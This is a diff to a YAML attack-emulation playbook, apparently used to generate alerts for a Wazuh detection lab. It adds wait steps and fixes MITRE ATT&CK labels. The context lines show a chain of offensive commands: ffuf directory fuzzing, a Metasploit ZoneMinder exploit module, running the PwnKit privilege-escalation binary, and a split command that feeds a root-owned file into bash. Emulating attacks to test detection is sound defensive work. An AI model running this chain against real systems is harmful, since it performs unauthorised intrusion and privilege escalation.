@@ -37,12 +37,20 @@ commands:
       tactics: "Reconnaissance"
       technique_name: "Active Scanning: Vulnerability Scanning"
 
+  # wazuh alerts arrive with delay of up to 15 seconds, therefore wait some time
+  - type: sleep
+    seconds: 30
+
   - type: shell
     cmd: "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
     metadata:
       techniques: "T1595.003"
       tactics: "Reconnaissance"
       technique_name: "Active Scanning: Wordlist Scanning"
+
+  # additional access logs will be produced for around 60 seconds after finishing ffuf, therefore wait some time
+  - type: sleep
+    seconds: 90
 
   - type: msf-module
     cmd: exploit/unix/webapp/zoneminder_snapshots
@@ -61,10 +69,6 @@ commands:
     stdapi: True
     session: "foothold"
     cmd: cd /tmp
-    metadata:
-      techniques: "T1105"
-      tactics: "Command and Control"
-      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
@@ -165,9 +169,9 @@ commands:
     cmd: chmod +x PwnKit && ./PwnKit
     session: "foothold"
     metadata:
-      techniques: "T1068, T1546, T1574"
+      techniques: "T1068"
       tactics: "Privilege Escalation"
-      technique_name: "Exploitation for Privilege Escalation,Event Triggered Execution,Hijack Execution Flow"
+      technique_name: "Exploitation for Privilege Escalation"
 
   - type: msf-session
     cmd: id
@@ -185,7 +189,7 @@ commands:
     metadata:
       techniques: "T1105,T1136.001"
       tactics: "Command and Control,Persistence"
-      technique_name:"Ingress Tool Transfer,Create Account: Local Account"
+      technique_name: "Ingress Tool Transfer,Create Account: Local Account"
 
   - type: msf-session
     cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
@@ -281,6 +285,7 @@ commands:
     metadata:
       techniques: "T1124"
       tactics: "Discovery"
+      technique_name: "System Time Discovery"
 
   - type: ssh
     cmd: sudo find /usr -name \*virtualbox\*
@@ -288,7 +293,7 @@ commands:
     metadata:
       techniques: "T1497.001"
       tactics: "Defense Evasion, Discovery"
-      technique_name: "Peripheral Device Discovery"
+      technique_name: "Virtualization/Sandbox Evasion: System Checks"
       #
       #  - type: msf-session
       #    cmd: sudo -l
@@ -307,3 +312,6 @@ commands:
       #  - type: msf-session
       #    cmd: ls -l /root
       #
+
+  - type: sleep
+    seconds: 30
